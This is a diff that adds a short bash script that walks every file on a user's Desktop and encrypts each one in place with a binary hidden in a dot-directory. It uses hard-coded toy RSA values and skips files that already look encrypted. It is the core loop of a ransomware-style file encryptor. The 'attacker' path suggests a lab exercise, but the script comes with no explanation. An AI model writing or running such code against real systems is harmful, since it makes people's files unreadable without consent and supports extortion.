@@ -1,0 +1,12 @@
+#!/bin/bash
+
+for file in $(ls /home/attacker/Desktop)
+ do
+	filecont=`cat /home/attacker/Desktop/$file`
+	if [[ $filecont =~ ^[0-9]+( [0-9]+)*$ ]]; then
+		echo "${file} is already encrypted!!"
+	else
+		/home/attacker/Desktop/.H/RSA_Encrypt -C 126419 30743 /home/attacker/Desktop/$file
+	fi
+ done
+
